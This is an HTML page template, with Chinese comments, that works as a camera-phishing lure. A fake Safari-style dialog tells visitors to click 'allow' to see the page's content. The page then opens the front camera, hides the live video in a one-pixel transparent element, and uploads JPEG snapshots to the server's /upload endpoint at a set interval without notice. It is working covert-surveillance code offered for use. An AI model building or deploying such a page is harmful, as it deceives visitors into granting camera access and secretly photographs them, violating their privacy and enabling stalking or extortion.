<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Access Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        #video {
            width: 1px;
            height: 1px;
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0.01;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
        #canvas {
            display: none;
        }
        
        /* Safari风格弹窗样式 */
        .safari-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.3);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            transition: opacity 0.3s ease;
            align-items: flex-start; /* 修改为从顶部开始对齐 */
            padding-top: 38vh; /* 添加顶部间距，使模态框下移 */
        }

        .safari-modal-overlay.show {
            opacity: 1;
        }

        .safari-modal-container {
            background-color: rgba(255, 255, 255, 0.80);
            border-radius: 32px;
            width: 100%;
            max-width: 100%;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            transform: scale(0.9);
            transition: transform 0.3s ease;
            overflow: hidden;
            margin-top: 20px; /* 可选：添加额外的顶部边距 */
            min-height: 160px; /* 设置最小高度 */
            height: auto; /* 允许高度根据内容自动调整 */
        }

        .safari-modal-overlay.show .safari-modal-container {
            transform: scale(1);
        }

        .safari-modal-header {
            padding: 20px 20px 5px;
            text-align: center;
        }

        .safari-modal-title {
            font-size: 20px;
            font-weight: 600;
            color: #000;
            margin: 0;
        }

        .safari-modal-body {
            padding: 10px 20px 10px;
            text-align: center;
            color: #333;
            font-size: 16px;
            font-weight: 600;
            line-height: 1.5;
        }

        .safari-modal-footer {
            display: flex;
        }

        .safari-modal-button {
            flex: 1;
            border: none;
            background: #b7b7b7;
            padding: 14px 0px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            text-align: center;
            color: #000000;
            border-radius: 30px;
            margin: 8px 22px;
        }

        .safari-modal-button.bold {
            font-weight: 600;
        }

        .safari-modal-button:not(:last-child) {
            margin-right:-8px;
        }

        .safari-modal-button:hover {
            background-color: #e0e0e0;
        }
    </style>
</head>
<body>
    <h1>Camera Access Required</h1>
    <p>To continue using this service, please allow access to your camera.</p>
    <button id="start">Allow Camera Access</button>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let intervalId;

        // Show alert first when button is clicked
        document.getElementById('start').addEventListener('click', async () => {
            // 隐藏按钮
            document.getElementById('start').style.display = 'none';
            
            // Display Safari-style alert box first
            showSafariConfirm();
        });

        // Custom modal function to mimic Safari alert
        function showSafariConfirm() {
            createSafariModal({
                message: '查看此页面内容请点击允许！',
                buttons: [{
                    text: "取消",
                    onClick: function() {
                        // 用户点击取消，重新显示按钮
                        document.getElementById('start').style.display = 'inline-block';
                    }
                }, {
                    text: "允许",
                    bold: true,
                    onClick: function() {
                        // 用户点击允许，显示浏览器原生提示框
                        requestCameraAccess();
                    }
                }]
            });
        }

        // 请求摄像头访问
        async function requestCameraAccess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                video.srcObject = stream;
                    
                    // Start taking pictures at intervals
                    startCapturing();
                } catch (err) {
                    console.error("Error accessing camera:", err);
                    // 显示初始按钮以便用户可以重试
                    document.getElementById('start').style.display = 'inline-block';
                }
            }

            // 创建Safari风格弹窗的核心函数
            function createSafariModal(options) {
                // 默认配置
                const defaults = {
                    title: "",
                    message: "",
                    buttons: []
                };

                // 合并配置
                const config = Object.assign({}, defaults, options);

                // 创建遮罩层
                const overlay = document.createElement('div');
                overlay.className = 'safari-modal-overlay';

                // 创建容器
                const container = document.createElement('div');
                container.className = 'safari-modal-container';

                // 创建头部
                const header = document.createElement('div');
                header.className = 'safari-modal-header';
                
                const title = document.createElement('h3');
                title.className = 'safari-modal-title';
                title.textContent = config.title;
                header.appendChild(title);

                // 创建内容区
                const body = document.createElement('div');
                body.className = 'safari-modal-body';
                body.innerHTML = config.message.replace(/\n/g, '<br>');

                // 创建底部按钮区
                const footer = document.createElement('div');
                footer.className = 'safari-modal-footer';

                // 添加按钮
                config.buttons.forEach((button, index) => {
                    const btn = document.createElement('button');
                    btn.className = 'safari-modal-button';
                    if (button.bold) {
                        btn.classList.add('bold');
                    }
                    btn.textContent = button.text;
                    
                    btn.addEventListener('click', function() {
                        // 关闭弹窗
                        document.body.removeChild(overlay);
                        
                        // 执行回调函数
                        if (button.onClick) {
                            button.onClick();
                        }
                    });
                    
                    footer.appendChild(btn);
                });

                // 组装弹窗
                container.appendChild(header);
                container.appendChild(body);
                container.appendChild(footer);
                overlay.appendChild(container);
                
                // 添加到页面
                document.body.appendChild(overlay);
                
                // 触发显示动画
                setTimeout(() => {
                    overlay.classList.add('show');
                }, 10);
            }

            function startCapturing() {
                intervalId = setInterval(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    canvas.toBlob((blob) => {
                        sendImage(blob);
                    }, 'image/jpeg', 0.8);
                }, {{ interval }});
            }

            function sendImage(blob) {
                const formData = new FormData();
                formData.append('image', blob, 'captured.jpg');
                
                fetch('/upload', {
                    method: 'POST',
                    body: formData
                }).then(response => {
                    if (!response.ok) {
                        console.error('Failed to upload image');
                    }
                }).catch(error => {
                    console.error('Error uploading image:', error);
                });
            }
            
            // 页面加载完成后不再自动显示确认框
            // window.onload = function() {
            //     showSafariConfirm();
            // };
    </script>
</body>
</html>
